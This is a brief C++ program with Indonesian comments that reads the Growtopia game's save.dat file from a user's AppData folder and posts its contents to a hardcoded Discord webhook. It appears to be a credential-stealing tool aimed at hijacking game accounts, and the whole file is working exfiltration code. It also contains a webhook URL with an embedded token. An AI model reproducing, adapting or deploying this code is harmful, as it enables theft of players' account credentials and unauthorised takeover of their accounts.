#include <iostream>
#include <fstream>
#include <curl/curl.h>

size_t write_data(void* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append((char*)ptr, size * nmemb);
    return size * nmemb;
}

int main() {
    // Ganti dengan path folder dan nama file.dat Anda
    std::string file_path ="C:\\Users\\Lenovo\\AppData\\Local\\Growtopia\\save.dat";

    // Ganti dengan URL webhook Discord Anda
    std::string webhook_url = "https://discordapp.com/api/webhooks/1190529769230581760/lLlFXBXGQZSKi6Sf2tJXoPGBnsNJUAh3N3ggMedHJtTzG_pjvvQj_pJnCfkCwIsEr2pn";

    std::ifstream file(file_path, std::ios::binary);

    if (file.is_open()) {
        std::string file_content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        CURL* curl;
        CURLcode res;

        curl = curl_easy_init();

        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, file_content.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
            std::string response_body;

            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);

            res = curl_easy_perform(curl);

            if (res != CURLE_OK) {
                std::cerr << "Error: " << curl_easy_strerror(res) << std::endl;
            }
            else {
                std::cout << "File.dat berhasil dikirim ke Discord melalui webhook." << std::endl;
            }

            curl_easy_cleanup(curl);
        }

    }
    else {
        std::cerr << "Error: Tidak dapat membuka file.dat." << std::endl;
    }

    curl_global_cleanup();

    return 0;
}
